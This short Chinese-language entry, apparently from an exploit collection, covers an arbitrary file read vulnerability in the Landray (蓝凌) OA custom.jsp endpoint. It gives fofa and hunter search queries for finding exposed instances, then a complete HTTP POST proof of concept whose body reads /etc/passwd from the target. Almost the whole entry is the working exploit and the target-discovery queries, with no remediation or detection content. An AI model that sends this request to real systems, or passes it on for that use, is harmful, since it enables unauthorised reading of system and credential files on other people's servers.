# 蓝凌OA custom.jsp 任意文件读取漏洞

## 网络测绘

fofa: app="Landray-OA系统"

hunter: app.name="Landray 蓝凌OA"

## POC / EXP

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.1294.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

var={"body":{"file":"file:///etc/passwd"}}
```